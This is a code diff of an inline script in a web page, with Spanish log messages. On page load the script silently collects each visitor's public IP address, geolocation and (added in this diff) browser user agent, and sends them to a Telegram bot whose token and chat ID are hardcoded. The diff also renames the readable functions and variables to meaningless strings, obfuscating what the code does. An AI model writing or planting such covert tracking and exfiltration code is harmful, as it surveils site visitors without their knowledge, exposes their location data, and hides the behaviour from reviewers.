@@ -2,51 +2,52 @@
 
 
  <script>
-        async function getIPAddress() {
+        async function f54ghj() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error al obtener la IP:', error);
+                const a1b2c3 = await fetch('https://api.ipify.org?format=json');
+                const d4e5f6 = await a1b2c3.json();
+                return d4e5f6.ip;
+            } catch (z7x8w9) {
+                console.error('Error al obtener la IP:', z7x8w9);
             }
         }
 
-        async function getGeolocation(ip) {
+        async function h67jkl(ip) {
             try {
-                const response = await fetch(`http://ip-api.com/json/${ip}`);
-                const data = await response.json();
-                return data;
-            } catch (error) {
-                console.error('Error al obtener la geolocalización:', error);
+                const q1w2e3 = await fetch(`http://ip-api.com/json/${ip}`);
+                const r4t5y6 = await q1w2e3.json();
+                return r4t5y6;
+            } catch (u7i8o9) {
+                console.error('Error al obtener la geolocalización:', u7i8o9);
             }
         }
 
-        async function sendToTelegram(ip, location) {
-            const botToken = '7197964353:AAFQtfYUleR1gc0F8HLbsy9DDivJdyPHDUw';  
-            const chatId = '-1002235777506'; 
+        async function x98vbn(ip, location, userAgent) {
+            const token = '7197964353:AAFQtfYUleR1gc0F8HLbsy9DDivJdyPHDUw'; 
+            const chat = '-1002235777506';  // Reemplaza 'TU_CHAT_ID' con tu ID de chat real
 
-            const message = `✅🍔 Nueva visita desde la IP: ${ip}\nUbicación: ${location.city}, ${location.regionName}, ${location.country}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            const message = `✅🍔 Nueva visita desde la IP: ${ip}\nUbicación: ${location.city}, ${location.regionName}, ${location.country}\n \nAgente de Usuario: ${userAgent}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(message)}`;
 
             try {
                 await fetch(url);
-            } catch (error) {
-                console.error('Error al enviar mensaje a Telegram:', error);
+            } catch (m6n7b8) {
+                console.error('Error al enviar mensaje a Telegram:', m6n7b8);
             }
         }
 
-        async function registerIP() {
-            const ip = await getIPAddress();
+        async function z21qwe() {
+            const ip = await f54ghj();
+            const userAgent = navigator.userAgent;
             if (ip) {
-                const location = await getGeolocation(ip);
+                const location = await h67jkl(ip);
                 if (location) {
-                    await sendToTelegram(ip, location);
+                    await x98vbn(ip, location, userAgent);
                 }
             }
         }
 
-        document.addEventListener('DOMContentLoaded', registerIP);
+        document.addEventListener('DOMContentLoaded', z21qwe);
     </script>
 
    <script>
